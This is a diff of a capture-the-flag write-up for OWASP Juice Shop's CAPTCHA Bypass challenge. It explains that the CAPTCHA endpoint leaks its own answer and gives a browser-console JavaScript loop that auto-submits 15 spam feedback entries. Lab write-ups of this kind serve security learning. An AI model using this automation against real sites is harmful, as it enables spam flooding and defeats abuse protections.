@@ -4,74 +4,88 @@
 
 ## Background
 
-The Contact Us feedback form retrieves a CAPTCHA from `GET /rest/captcha/`, returning a response like:
+The Contact Us feedback form retrieves a CAPTCHA from `GET /rest/captcha/`, which returns a math question along with its own pre-computed answer, e.g.:
 
 ```json
-{"captchaId":18,"captcha":"5*8*8","answer":"320"}
+{"captchaId": 1, "captcha": "9-6*8", "answer": "-39"}
 ```
 
-The form submission (`POST /api/Feedbacks`) sends back the solved `captcha` and matching `captchaId`:
-
-```json
-{"comment":"Hello","rating":1,"captcha":"320","captchaId":18}
-```
-
-Critically, the server does not enforce that the `captchaId`/`captcha` pair used must be the *most recently issued* one — any previously issued, correctly solved pair is still accepted. This means a CAPTCHA can effectively be "pinned" and reused, or alternatively, a script can simply fetch and solve a fresh CAPTCHA automatically for each submission. Since solving CAPTCHAs manually one at a time cannot realistically hit 10 submissions in 20 seconds, this needs to be automated.
+Since the server hands back the answer in the same response, a script can simply fetch a fresh CAPTCHA and immediately submit feedback using the answer it was just given — no actual solving needed. Submitting 10+ feedbacks within 20 seconds this way is far faster than any human typing them one at a time.
 
 ## Steps Taken
 
-### 1. Confirmed the CAPTCHA/feedback flow
+### 1. Went to the Contact page
 
-Opened DevTools (`F12`) → **Network** tab, visited `http://localhost:3000/#/contact`, and observed the `GET /rest/captcha/` request and its response shape, followed by the `POST /api/Feedbacks` request when submitting a feedback manually.
+```
+http://localhost:3000/#/contact
+```
 
-### 2. Confirmed CAPTCHA pinning was possible
+<img width="966" height="955" alt="Screenshot 2026-10-12 223638" src="https://github.com/user-attachments/assets/4dc594e4-0d21-4b7a-9e4e-866f4a36f217" />
 
-Submitted one feedback normally, then requested a new CAPTCHA, but submitted a second feedback using the **previous** `captchaId`/`answer` pair instead of the newly issued one. The server accepted it, confirming old CAPTCHA pairs remain valid.
+### 2. Watched the Network tab
 
-### 3. Automated the submissions with a browser console script
+Opened DevTools (`F12`) → **Network** tab and reloaded the page, then located the request to:
 
-Rather than relying only on pinning, used a script that fetches a **fresh CAPTCHA for every submission** (robust even if pinning were fixed), run directly in the browser Console on the Juice Shop page:
+```
+/rest/captcha/
+```
+
+<img width="966" height="313" alt="Screenshot 2026-10-12 223815" src="https://github.com/user-attachments/assets/24de6594-4674-4574-8865-c714618e00a1" />
+
+Clicked it and checked its **Response** tab, confirming the shape of the data:
+
+```json
+{"captchaId": 1, "captcha": "9-6*8", "answer": "-39"}
+```
+
+<img width="966" height="955" alt="Screenshot 2026-10-12 223925" src="https://github.com/user-attachments/assets/83cae2a0-1b25-41ab-bf6e-bde095dda38f" />
+
+### 3. Wrote a submission script
+
+Wrapped the loop inside an async IIFE (`(async () => { ... })();`) so `await` could be used inside it to fetch a fresh CAPTCHA and submit feedback in sequence:
 
 ```javascript
-for (let i = 0; i < 15; i++) {
-  const response = await fetch(`${location.origin}/rest/captcha/`, {
-    method: 'GET',
-    headers: { 'Content-type': 'text/plain' }
-  });
-  if (response.status === 200) {
-    const { captchaId, answer } = await response.json();
-    await fetch(`${location.origin}/api/Feedbacks`, {
-      method: 'POST',
-      cache: 'no-cache',
-      headers: { 'Content-type': 'application/json' },
-      body: JSON.stringify({
-        captchaId,
-        captcha: `${answer}`,
-        comment: `Spam #${i}`,
-        rating: 3
-      })
+(async () => {
+  for (let i = 0; i < 15; i++) {
+    const response = await fetch(`${location.origin}/rest/captcha/`, {
+      method: 'GET',
+      headers: { 'Content-type': 'text/plain' }
     });
+    if (response.status === 200) {
+      const { captchaId, answer } = await response.json();
+      await fetch(`${location.origin}/api/Feedbacks`, {
+        method: 'POST',
+        cache: 'no-cache',
+        headers: { 'Content-type': 'application/json' },
+        body: JSON.stringify({
+          captchaId,
+          captcha: `${answer}`,
+          comment: `Spam #${i}`,
+          rating: 3
+        })
+      });
+    }
   }
-}
+})();
 ```
 
 ### 4. Ran the script
 
-Pasted the script into the Console and pressed Enter, firing 15 feedback submissions in rapid succession, well within the 20-second window and comfortably over the required 10.
+Pasted it into the Console and pressed Enter. The loop ran through 15 iterations, each fetching a new CAPTCHA and immediately submitting a feedback with its matching answer.
 
 ## Result
 
-Challenge solved — confirmed by the in-app success notification and the Score Board.
+Challenge solved — confirmed instantly by the in-app success banner:
+
+> "You successfully solved a challenge: CAPTCHA Bypass (Submit 10 or more customer feedbacks within 20 seconds.)"
+
+<img width="966" height="955" alt="Screenshot 2026-10-12 231111" src="https://github.com/user-attachments/assets/53b8d8fa-f473-486f-9f10-b2961652d0f9" />
+
+<img width="966" height="955" alt="Screenshot 2026-10-12 231251" src="https://github.com/user-attachments/assets/ed35d460-aad4-4787-b0a7-c448d7ffe573" />
 
 ## Root Cause
 
-The CAPTCHA mechanism exists purely as a client-facing deterrent — the server accepts any previously issued, correctly solved `captchaId`/`captcha` pair rather than strictly requiring the most recently issued one. Combined with no rate limiting on the feedback endpoint itself, this allows automated, high-volume submissions that a human-facing CAPTCHA is meant to prevent.
-
-## Notes
-
-Alternative approaches mentioned in the official solution guide:
-- A tool like **Selenium WebDriver** could read the CAPTCHA question from the page's HTML, solve it with JavaScript, and type the answer into the form field like a real user, avoiding the API entirely.
-- A load-testing tool such as **RaceTheWeb** could fire repeated `POST` requests using a single pinned `captchaId`/`captcha` pair.
+The CAPTCHA endpoint returns the correct answer directly in its own response, along with the question. The server does not require the answer to be computed independently by the client — only that *some* previously issued `captchaId`/`answer` pair be echoed back, making it trivial to automate.
 
 ## Status
 
